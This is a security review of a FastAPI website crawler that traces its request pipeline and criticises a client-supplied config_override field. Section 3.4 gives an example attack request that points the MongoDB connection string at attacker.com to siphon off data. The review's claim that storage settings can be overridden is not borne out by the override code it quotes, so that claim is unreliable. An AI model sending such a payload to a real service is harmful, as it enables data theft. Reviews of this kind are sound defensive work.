# End-to-End Architecture & Security Review

## Executive Summary

This document provides a comprehensive review of the Website Crawler Service codebase, analyzing the architecture, request flow, and **critical configuration ownership** to identify security vulnerabilities.

**⚠️ CRITICAL SECURITY FINDING**: The system exposes a `config_override` mechanism that allows clients to override backend-controlled configurations, including infrastructure settings, timeouts, retries, and storage configurations. This is a **HIGH-RISK** security vulnerability.

---

## 1. High-Level Architecture

### 1.1 Major Components

The system is organized into the following major layers:

#### **API Layer** (`controller/`)
- **Entry Point**: `main.py` - FastAPI application initialization
- **Router**: `crawl_controller.py` - HTTP endpoints (`/crawl`, `/crawl/batch`)
- **Models**: `models.py` - Request/Response Pydantic models
- **Policy Resolver**: `policy_resolver.py` - Maps client intent to internal configuration

#### **Orchestration Layer** (`crawler/`)
- **Orchestrator**: `orchestrator.py` - Main coordination logic
- **Strategies**: `crawl_strategy/` - BFS, DFS, Sitemap, Adaptive strategies
- **Engine**: `engine/` - Crawl4AI wrapper, browser configuration, performance settings
- **Extractors**: `extraction/` - CSS, XPath, LLM content extractors
- **URL Processing**: `url/` - Validation, normalization, filtering
- **Processing**: `processing/` - Chunking, batching, change detection
- **Parsing**: `parsing/` - HTML parsing, markdown conversion

#### **Storage Layer** (`storage/`)
- **MongoStorage**: `mongo.py` - MongoDB backend implementation
- **Base Storage**: `base.py` - Abstract storage interface

#### **Configuration Layer** (`config/`)
- **Schema**: `schema.py` - Pydantic models for configuration validation
- **Loader**: `loader.py` - Configuration loading with environment variable overrides
- **Defaults**: `defaults.json` - Default configuration values

#### **Utilities** (`utils/`)
- **Logging**: `logging_config.py` - Structured logging
- **Hashing**: `hashing.py` - Content hashing and ID generation
- **Time**: `time.py` - Time utilities

### 1.2 Component Interactions

```
┌─────────────┐
│   Client    │
└──────┬──────┘
       │ HTTP Request
       ▼
┌─────────────────────────────────┐
│  FastAPI (main.py)              │
│  ┌───────────────────────────┐  │
│  │ CrawlController           │  │
│  │ - /crawl (single)         │  │
│  │ - /crawl/batch (multi)    │  │
│  └──────┬────────────────────┘  │
└─────────┼───────────────────────┘
          │
          ▼
┌─────────────────────────────────┐
│  PolicyResolver                 │
│  - Resolves client intent       │
│  - Applies safety policies      │
│  - ⚠️ Applies config_override   │
└──────┬──────────────────────────┘
       │
       ▼
┌─────────────────────────────────┐
│  CrawlOrchestrator              │
│  - Coordinates pipeline          │
│  - Manages components           │
└──────┬──────────────────────────┘
       │
       ├──► URLValidator ──► URLNormalizer ──► URLFilter
       │
       ├──► Crawl4AIEngine (browser automation)
       │
       ├──► ExtractorFactory ──► [CSS|XPath|LLM]Extractor
       │
       ├──► StrategyFactory ──► [BFS|DFS|Sitemap|Adaptive]Strategy
       │
       ├──► ChunkingService (optional)
       │
       └──► MongoStorage ──► MongoDB
```

### 1.3 Data Flow

1. **Request Entry**: FastAPI receives HTTP request
2. **Validation**: Pydantic validates `ClientCrawlRequest`
3. **Policy Resolution**: `PolicyResolver` maps client intent to internal config
4. **Orchestration**: `CrawlOrchestrator` coordinates the crawl pipeline
5. **URL Processing**: Validation → Normalization → Filtering
6. **Crawling**: `Crawl4AIEngine` fetches HTML
7. **Extraction**: Extractor extracts content (text, links, images, metadata)
8. **Processing**: Optional chunking, markdown conversion
9. **Storage**: `MongoStorage` persists documents
10. **Response**: Returns document IDs and status

---

## 2. Request → Response Flow

### 2.1 Single URL Crawl (`POST /crawl`)

**Step-by-Step Trace:**

#### **Step 1: Request Entry** (`main.py:23-30`)
```python
app = FastAPI(...)
app.include_router(crawl_router)  # Includes /crawl endpoints
```

#### **Step 2: Endpoint Handler** (`crawl_controller.py:297-344`)
```297:344:website_crawler/controller/crawl_controller.py
async def crawl_url(request: ClientCrawlRequest) -> CrawlResponse:
    """
    Crawl a URL and store the results.
    
    Args:
        request: Client crawl request with intent-based configuration
        
    Returns:
        CrawlResponse with crawl results
        
    Raises:
        HTTPException: If crawl fails
    """
    url_str = str(request.url)
    request_logger = logger.with_url(url_str)
    
    with request_logger.component_flow("crawl_url", url=url_str):
        try:
            # Get orchestrator
            request_logger.log_entry("get_orchestrator")
            orchestrator = get_orchestrator()
            request_logger.log_exit("get_orchestrator", status="retrieved")
            
            # Resolve client intent to internal config
            config_dict = await _resolve_request_config(request, orchestrator, request_logger)
            
            # Use isolated config context
            with isolated_config(orchestrator, config_dict):
                # Crawl the URL using unified architecture
                request_logger.log_entry("orchestrator.crawl_url_unified", url=url_str)
                source_page = await orchestrator.crawl_url_unified(url_str)
                request_logger.log_exit("orchestrator.crawl_url_unified", 
                                       source_page_id=source_page.source_page_id,
                                       status="success")
                
                response = CrawlResponse(
                    success=True,
                    document_id=source_page.source_page_id,
                    url=source_page.url,
                    message="Crawl completed successfully",
                    warnings=[]
                )
                request_logger.log_state_change("request_pending", "request_completed", 
                                             document_id=source_page.source_page_id)
                return response
            
        except (ValidationError, CrawlError, StorageError, Exception) as e:
            raise _handle_crawl_exception(e, url_str, request_logger)
```

**Key Functions:**
- `get_orchestrator()` - Gets or creates singleton orchestrator
- `_resolve_request_config()` - Maps client request to internal config
- `isolated_config()` - Context manager for temporary config application

#### **Step 3: Policy Resolution** (`policy_resolver.py:19-39`)
```19:39:website_crawler/controller/policy_resolver.py
async def resolve(self, client_request: ClientCrawlRequest) -> MainConfig:
        """Resolve client request into full internal configuration."""
        # Convert to dict for modification (MainConfig is frozen)
        config_dict = self.base_config.model_dump()
        
        self._apply_crawl_scope(client_request, config_dict)
        await self._apply_strategy(client_request, config_dict)
        self._apply_rendering(client_request, config_dict)
        self._apply_extraction(client_request, config_dict)
        self._apply_domain_restrictions(client_request, config_dict)
        self._apply_chunking(client_request, config_dict)
        self._apply_safety_policies(config_dict)
        
        # Apply config override if provided (after all other policies)
        if client_request.config_override:
            self._apply_config_override(client_request.config_override, config_dict)
            # Re-apply safety policies after override to ensure safety limits are maintained
            self._apply_safety_policies(config_dict)
        
        # Validate and return MainConfig
        return MainConfig.model_validate(config_dict)
```

**⚠️ SECURITY ISSUE**: `config_override` is applied AFTER safety policies, then safety policies are re-applied. However, the override can still bypass many backend controls.

#### **Step 4: Orchestrator Pipeline** (`orchestrator.py:690-890`)

**4a. URL Validation & Normalization** (lines 720-724)
```720:724:website_crawler/crawler/orchestrator.py
                # Step 1: Validate and normalize URL
                validate_url(url)
                validate_scheme(url)
                is_crawlable(url)
                normalized_url = normalize_url(url)
```

**4b. URL Filtering** (lines 736-747)
```736:747:website_crawler/crawler/orchestrator.py
                # Step 3: Check URL filter
                crawler_config = self.config.get('crawler', {})
                filter_settings = {
                    'respect_robots_txt': crawler_config.get('respect_robots_txt', True),
                    'user_agent': crawler_config.get('user_agent', 'CrawlerBot'),
                    'allowed_domains': crawler_config.get('allowed_domains'),
                    'blocked_domains': crawler_config.get('blocked_domains'),
                    'exclude_patterns': crawler_config.get('exclude_patterns', []),
                }
                should_crawl = self.url_filter.should_crawl(normalized_url, filters=filter_settings)
                if not should_crawl:
                    raise ValidationError(f"URL filtered out: {normalized_url}")
```

**4c. Page Crawling** (lines 749-753)
```749:753:website_crawler/crawler/orchestrator.py
                # Step 4: Crawl URL
                raw_page: RawPage = await self.engine.crawl_url(
                    normalized_url,
                    config=self.config.get('crawler', {})
                )
```

**4d. Content Extraction** (lines 755-757)
```755:757:website_crawler/crawler/orchestrator.py
                # Step 5: Extract content
                extracted = self.extractor.extract(normalized_url, raw_page.html)
                content_text = extracted.get('text', '')
```

**4e. Change Detection & Chunking** (lines 767-814)
- Detects if page content changed
- Generates chunks if chunking enabled
- Marks obsolete chunks

**4f. Storage** (line 874)
```874:874:website_crawler/crawler/orchestrator.py
                self.storage.save_source_page(source_page.to_mongodb_dict())
```

### 2.2 Batch Crawl (`POST /crawl/batch`)

Similar flow but uses `crawl_with_strategy_unified()` which:
1. Creates a `CrawlRun` record
2. Uses strategy to discover URLs iteratively
3. Crawls each URL using `crawl_url_unified()`
4. Updates `CrawlRun` with statistics

---

## 3. Configuration Ownership Review (CRITICAL)

### 3.1 Configuration Sources

The system loads configuration from multiple sources in this order (later sources override earlier):

1. **Backend Defaults** (`config/defaults.json`) - ✅ Backend-controlled
2. **User Config File** (if provided) - ⚠️ Could be client-controlled
3. **Environment Variables** (`config/loader.py:_load_env_overrides()`) - ✅ Backend-controlled
4. **Client Request** (`ClientCrawlRequest`) - ⚠️ Client-controlled
5. **Config Override** (`config_override` field) - ⚠️ **HIGH RISK - Client-controlled**

### 3.2 Backend-Controlled Configurations (MUST NEVER be client-modifiable)

These should **ONLY** be set via backend config files or environment variables:

#### **Storage Configuration**
- `storage.connection_string` - MongoDB connection string
- `storage.database` - Database name
- `storage.username` - Database credentials
- `storage.password` - Database credentials
- `storage.auth_source` - Authentication source
- `storage.max_pool_size` - Connection pool size
- `storage.max_document_size` - Max document size

#### **Engine Infrastructure**
- `engine.browser_type` - Browser type (chromium/firefox/webkit)
- `engine.viewport_width` - Viewport dimensions
- `engine.viewport_height` - Viewport dimensions
- `engine.headless` - Headless mode (should be backend-controlled)

#### **Performance & Rate Limiting**
- `crawler.rate_limit` - Rate limiting (requests/second)
- `crawler.concurrent_requests` - Concurrent request limit
- `crawler.retries` - Retry count (minimum enforced)
- `crawler.timeout` - Request timeout (maximum enforced)
- `crawler.delay` - Delay between requests (minimum enforced for large crawls)

#### **Safety & Security**
- `crawler.respect_robots_txt` - Should always be True (enforced)
- `crawler.max_html_size` - Maximum HTML size (enforced)
- `crawler.max_pages` - Maximum pages (enforced via env var)
- `crawler.max_depth` - Maximum depth (enforced via env var)

#### **Logging Configuration**
- `logging.level` - Log level
- `logging.format` - Log format
- `logging.file_path` - Log file path
- `logging.console_enabled` - Console logging
- `logging.file_enabled` - File logging

### 3.3 Client-Controlled Configurations (Safe Inputs)

These are **intent-based** and safe for clients to control:

- `url` - Target URL
- `max_pages` - Limited by backend (CRAWLER_MAX_PAGES_LIMIT)
- `max_depth` - Limited by backend (CRAWLER_MAX_DEPTH_LIMIT)
- `strategy` - Crawl strategy (auto/sitemap/bfs/dfs)
- `render_js` - JavaScript rendering toggle
- `extract` - What to extract (text, links, images, metadata)
- `selectors` - CSS selectors for extraction
- `allowed_domains` - Domain whitelist (additive, not replacement)
- `exclude_patterns` - URL exclusion patterns (additive)
- `priority_patterns` - URL priority patterns
- `wait_for` - CSS selector or timeout to wait for
- `enable_chunking` - Enable document chunking

### 3.4 ⚠️ CRITICAL SECURITY VIOLATIONS

#### **Violation #1: Config Override Allows Infrastructure Override**

**Location**: `controller/models.py:80-83`, `policy_resolver.py:195-208`

```80:83:website_crawler/controller/models.py
    config_override: Optional[ConfigOverride] = Field(
        default=None,
        description="Advanced configuration override (use with caution)"
    )
```

```195:208:website_crawler/controller/policy_resolver.py
    def _apply_config_override(self, override: ConfigOverride, config_dict: Dict[str, Any]) -> None:
        """Apply type-safe config override."""
        if override.crawler:
            config_dict["crawler"].update(override.crawler)
        if override.engine:
            config_dict["engine"].update(override.engine)
        if override.extraction:
            config_dict["extraction"].update(override.extraction)
        if override.strategy:
            config_dict["strategy"].update(override.strategy)
        if override.chunking:
            config_dict["chunking"] = {**config_dict.get("chunking", {}), **override.chunking}
        
        self.logger.info("[PolicyResolver] Applied config override")
```

**Risk**: Clients can override:
- `crawler.timeout` - Can set to very high values (DoS)
- `crawler.retries` - Can set to 0 (bypass retry logic)
- `crawler.rate_limit` - Can bypass rate limiting
- `crawler.delay` - Can set to 0 (aggressive crawling)
- `engine.browser_type` - Can change browser type
- `engine.viewport_width/height` - Can change viewport
- `storage.*` - **CRITICAL**: Can override storage connection strings!

**Mitigation**: Safety policies are re-applied after override, but they only enforce:
- Max pages limit
- Min delay for large crawls
- Min retries
- Max timeout
- Max rate limit
- Force robots.txt respect
- Max HTML size
- Max wait timeout

**Missing Protections**:
- ❌ No protection against storage config override
- ❌ No protection against engine config override (browser_type, viewport)
- ❌ No protection against concurrent_requests override
- ❌ No protection against logging config override

#### **Violation #2: Safety Policies Can Be Bypassed**

**Location**: `policy_resolver.py:139-193`

The `_apply_safety_policies()` method enforces limits, but:
1. It's called AFTER `config_override` is applied
2. It only enforces a subset of critical settings
3. Storage and engine configs are not protected

**Example Attack**:
```json
{
  "url": "https://example.com",
  "config_override": {
    "storage": {
      "connection_string": "mongodb://attacker.com:27017",
      "database": "stolen_data"
    },
    "crawler": {
      "timeout": 3600,
      "retries": 0,
      "rate_limit": 1000
    }
  }
}
```

This could:
- Redirect data to attacker's MongoDB
- Cause DoS with high timeout/rate_limit
- Bypass retry logic

#### **Violation #3: Environment Variable Overrides Not Validated**

**Location**: `config/loader.py:49-128`

Environment variables can override any config value, but there's no validation that they're set by authorized backend processes.

### 3.5 Recommended Fixes

#### **Fix #1: Remove or Restrict Config Override**

**Option A: Remove entirely** (Recommended)
- Remove `config_override` field from `ClientCrawlRequest`
- Remove `_apply_config_override()` method

**Option B: Whitelist allowed overrides**
- Only allow safe overrides (extraction.selectors, strategy.priority_patterns)
- Block all infrastructure settings

#### **Fix #2: Add Configuration Validation Layer**

Create a `ConfigValidator` that:
1. Validates config before applying to orchestrator
2. Blocks any storage/engine/infrastructure overrides from client
3. Enforces all safety limits regardless of source

#### **Fix #3: Separate Client Config from Backend Config**

- Create `ClientConfig` model (only safe fields)
- Create `BackendConfig` model (infrastructure settings)
- Never merge client config into backend config
- Use backend config for infrastructure, client config for intent

#### **Fix #4: Add Configuration Audit Logging**

- Log all configuration changes
- Log source of each config value (default/env/client)
- Alert on suspicious overrides

---

## 4. Additional Security Concerns

### 4.1 URL Validation

✅ **Good**: Comprehensive URL validation in `url/validator.py`
- Validates scheme (http/https only)
- Checks for malicious patterns
- Validates domain format
- Enforces max URL length

### 4.2 Robots.txt Compliance

✅ **Good**: Robots.txt checking is enforced by default
- Can be overridden via `config_override` ⚠️
- Should be hardcoded to True

### 4.3 Rate Limiting

⚠️ **Partial**: Rate limiting exists but can be overridden
- `CRAWLER_MAX_RATE_LIMIT` env var provides protection
- But `config_override` can still bypass if not properly validated

### 4.4 Storage Security

❌ **Critical**: Storage connection strings can be overridden
- No validation that storage config is backend-controlled
- Client could redirect data to malicious MongoDB instance

### 4.5 Error Handling

✅ **Good**: Comprehensive error handling
- Proper exception types (ValidationError, CrawlError, StorageError)
- Appropriate HTTP status codes
- Error messages don't leak sensitive info

---

## 5. Summary

### 5.1 Architecture Strengths

1. ✅ Clean separation of concerns
2. ✅ Well-structured component hierarchy
3. ✅ Comprehensive logging and observability
4. ✅ Good error handling
5. ✅ Flexible extraction and strategy patterns

### 5.2 Critical Security Issues

1. ❌ **CRITICAL**: `config_override` allows infrastructure override
2. ❌ **HIGH**: Storage config can be overridden by clients
3. ❌ **HIGH**: Engine config can be overridden by clients
4. ❌ **MEDIUM**: Safety policies don't cover all critical settings
5. ⚠️ **MEDIUM**: No configuration audit logging

### 5.3 Recommendations Priority

**P0 (Immediate)**:
1. Remove or severely restrict `config_override` functionality
2. Add validation to prevent storage/engine config overrides
3. Hardcode `respect_robots_txt` to True

**P1 (High Priority)**:
1. Add configuration validation layer
2. Separate client config from backend config models
3. Add configuration audit logging

**P2 (Medium Priority)**:
1. Add rate limiting at API level (not just crawler level)
2. Add request size limits
3. Add authentication/authorization for API endpoints

---

## 6. Request Flow Diagram

```
Client Request
    │
    ▼
FastAPI Router (/crawl)
    │
    ▼
CrawlController.crawl_url()
    │
    ▼
PolicyResolver.resolve()
    │
    ├─► Apply client intent (max_pages, strategy, etc.)
    ├─► Apply safety policies
    └─► ⚠️ Apply config_override (SECURITY RISK)
    │
    ▼
CrawlOrchestrator.crawl_url_unified()
    │
    ├─► URL Validation (validator.py)
    ├─► URL Normalization (normalizer.py)
    ├─► URL Filtering (filter.py) - robots.txt, domains, patterns
    ├─► Crawl4AIEngine.crawl_url() - Fetch HTML
    ├─► Extractor.extract() - Extract content
    ├─► Change Detection - Detect content changes
    ├─► Chunking (optional) - Generate chunks
    └─► MongoStorage.save_source_page() - Persist
    │
    ▼
CrawlResponse (document_id, url, success)
```

---

**Review Date**: 2024
**Reviewer**: Senior Backend Architect & Security Reviewer
**Status**: ⚠️ CRITICAL SECURITY ISSUES IDENTIFIED - IMMEDIATE ACTION REQUIRED

